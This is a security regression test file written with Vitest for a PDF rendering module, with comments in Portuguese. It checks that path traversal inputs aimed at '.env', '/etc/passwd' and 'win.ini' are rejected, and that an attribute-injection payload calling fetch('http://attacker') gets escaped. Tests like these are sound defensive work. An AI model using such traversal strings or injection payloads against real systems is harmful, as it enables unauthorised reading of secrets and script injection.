import { describe, it, expect } from "vitest";
import { dentroDePublic } from "@/lib/pdf/render";
import { esc } from "@/lib/pdf/template";

// Regressões de segurança do render de PDF (entrada do cliente via /api/pdf).
describe("segurança — render de PDF", () => {
  it("dentroDePublic: aceita asset legítimo de public/", () => {
    expect(dentroDePublic("/produtos/primmax-plus.svg")).toMatch(/public/);
  });

  it("dentroDePublic: rejeita path traversal (LFI)", () => {
    expect(dentroDePublic("/../.env")).toBeNull();
    expect(dentroDePublic("/../../etc/passwd.png")).toBeNull();
    expect(dentroDePublic("/..\\..\\windows\\win.ini")).toBeNull();
  });

  it("dentroDePublic: rejeita extensão não-imagem (anti-LFI de .env/.json)", () => {
    expect(dentroDePublic("/produtos/primmax-plus.txt")).toBeNull();
    expect(dentroDePublic("/data/catalogo.json")).toBeNull();
  });

  it("esc: neutraliza aspas e tags (anti-injeção de atributo/HTML)", () => {
    const malicioso = `x" onerror="fetch('http://attacker')`;
    const saida = esc(malicioso);
    expect(saida).not.toContain('"');
    expect(esc("<img src=x>")).toBe("&lt;img src=x&gt;");
    expect(esc("a'b")).toBe("a&#39;b");
  });
});
